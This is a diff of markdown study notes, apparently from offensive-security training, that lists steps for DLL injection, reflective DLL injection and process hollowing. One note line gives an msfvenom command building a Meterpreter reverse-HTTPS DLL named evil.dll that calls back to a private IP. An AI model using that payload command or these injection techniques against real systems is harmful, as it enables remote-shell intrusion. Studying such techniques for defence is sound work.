@@ -1,6 +1,6 @@
-Theory / Notes / Code
+# Theory / Notes
 
-# DLL Injection 
+## DLL Injection 
 1. Selecting the Target Process: Choose the process into which you want to inject the DLL. This process is identified by its Process ID (PID).
 2. Opening the Target Process: Open the selected process, granting access rights to manipulate its memory and threads.
 3. Allocating Memory in the Target Process: Allocate memory within the target process to store the path of the DLL being injected and other necessary data structures.
@@ -11,7 +11,7 @@ Theory / Notes / Code
 <br>
 Note: Generated DLLs with msfvenom -p windows/x64/meterpreter/reverse_https LHOHOST=192.168.162.140 LPORT=443 -f dll -o /var/www/html/evil.dll
 
-# Reflective DLL Injection 
+## Reflective DLL Injection 
 1. Downloading the Reflective DLL: Download a reflective DLL from a specified URL or location.
 2. Opening the Target Process: Open the target process into which you want to inject the reflective DLL. This process is identified by its Process ID (PID).
 3. Allocating Memory in the Target Process: Allocate memory within the target process to store the reflective DLL's code and other necessary data structures.
@@ -20,7 +20,7 @@ Note: Generated DLLs with msfvenom -p windows/x64/meterpreter/reverse_https LHOH
 6. Executing Reflective Loader: Optionally, a reflective loader may be used to simplify the reflective DLL injection process. The reflective loader is responsible for loading the reflective DLL into memory and executing it, making the injection process more streamlined.
 7. Cleaning Up Resources: As with traditional DLL injection, release allocated memory and close handles to clean up resources after reflective DLL injection is completed.
 
-# Process Hollowing
+## Process Hollowing
 1. Downloading the Legitimate Executable: You download an executable file from a specified URL.
 2. Opening the Target Process: You open the process into which you want to inject the executable. This process is identified by its Process ID (PID).
 3. Allocating Memory in the Target Process: You allocate memory within the target process to store the executable's code.
